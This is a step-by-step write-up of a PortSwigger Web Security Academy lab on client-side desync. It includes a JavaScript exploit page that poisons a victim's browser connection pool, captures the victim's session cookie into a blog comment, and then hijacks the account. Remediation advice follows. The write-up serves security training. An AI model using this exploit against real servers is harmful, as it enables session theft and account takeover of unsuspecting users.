# Lab 20: Client-Side Desync

**Category:** HTTP Request Smuggling
**Difficulty:** Expert
**Lab link:** [Client-side desync attacks](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

## Overview

Classic HTTP request smuggling requires a front-end/back-end proxy chain. Client-side desync (CSD) is different — it poisons the victim's **own browser** connection pool, with no proxy required. By causing a victim's browser to send two requests on the same TCP connection where the first request's `Content-Length` is larger than the actual body, the second request gets treated as the continuation of the first request's body by the server. This captures the victim's data (cookies, headers) into attacker-controlled storage.

## Key Concepts

- **Connection pool poisoning:** browsers reuse TCP connections for requests to the same origin. CSD exploits this by leaving a connection in a "partially read" state so the next request on that connection is smuggled.
- **Content-Length larger than body:** the smuggled POST has `Content-Length: 500` but only ~112 bytes of body. The server waits for 388 more bytes — the victim's next request fills that gap and gets stored as the POST body (e.g., a comment).
- **mode: "cors"** on the first fetch causes a CORS error, which makes the browser not follow the 302 redirect. This leaves the connection half-open in the pool.
- **mode: "no-cors"** on the second fetch reuses that poisoned connection without triggering another error.
- **credentials: "include"** on both fetches ensures the browser uses the authenticated connection pool, so the victim's session cookie is included in the leaked request.

## Why It Works Without a Proxy

Normal desync: `Attacker → Front-end → Back-end` (attacker poisons shared proxy→back-end socket)
Client-side desync: `Victim's browser → Server` (attacker poisons victim's own browser→server socket via their browser running exploit JS)

No shared infrastructure needed — any server that ignores `Content-Length` on certain endpoints is vulnerable.

## Solution

### Step 1 — Confirm the desync endpoint

Confirm the root `/` endpoint accepts a POST body and doesn't validate `Content-Length` against the actual body length (i.e., it's CL.0 vulnerable from the client side).

### Step 2 — Build the exploit page

Create an HTML page that the victim's browser will execute:

```javascript
var smuggledRequest = [
    "POST /en/post/comment HTTP/1.1",
    "Host: <lab>",
    "Cookie: session=<your-session>",
    "Content-Length: 500",
    "Content-Type: application/x-www-form-urlencoded",
    "Connection: close",
    "",
    "csrf=<your-csrf>&postId=2&name=Foobie&email=foo@bar.com&website=https://bar.com&comment=Foo",
].join("\r\n");

fetch("https://<lab>/", {
    method: "POST",
    body: smuggledRequest,
    credentials: "include",
    mode: "cors",
}).catch(() => {
    fetch("https://<lab>/en", {
        mode: "no-cors",
        credentials: "include",
    });
});
```

**Key values:**
- `Content-Length: 500` — intentionally larger than actual body (~112 bytes); the remaining ~388 bytes will be stolen from the victim's follow-up request
- `session` and `csrf` — your own lab account values (used to authorize the comment POST)
- `postId=2` — the blog post where stolen data will appear as a comment

### Step 3 — Deliver via exploit server

Paste the full HTML page into the exploit server body and click "Deliver exploit to victim".

### Step 4 — Retrieve the stolen session

Go to the blog post at `/en/post?postId=2`. The latest comment will contain the beginning of the victim's request, including their `Cookie: session=...` header.

### Step 5 — Hijack the session

Use the stolen `session` cookie to access `/my-account` as the victim. Lab solved.

## Exploit File

`exploit.html` in this directory contains the template. Update `session` and `csrf` with live values before delivering.

## Why Content-Length Must Be Larger Than the Body

```
Actual body length:  ~112 bytes
Content-Length set:   500 bytes
Gap:                 ~388 bytes  ← stolen from victim's next request

Server receives body: [your 112 bytes] + [first 388 bytes of victim's GET /en request]
                                                    ↑ includes victim's Cookie header
```

The server stores this combined string as the comment body. When you view the post, you see the victim's headers embedded in the comment text.

## Remediation

- Reject POST requests where `Content-Length` exceeds the actual received body (or close the connection immediately after serving the response).
- Disable HTTP keep-alive / connection reuse on sensitive endpoints.
- Set `Cross-Origin-Opener-Policy: same-origin` to prevent cross-origin access to the connection pool.
- Ensure CORS preflight responses don't expose sensitive connection-state endpoints.

## Key Takeaways

- CSD requires no shared infrastructure — the victim's own browser is the attack vector.
- `mode: "cors"` + error is essential to leave the connection in the pool without following the redirect.
- `Content-Length` must be large enough to capture a meaningful prefix of the victim's request (including their Cookie header).
- The attacker's own session/CSRF is used to authorize the comment POST — the victim's session is what gets captured inside the comment body.
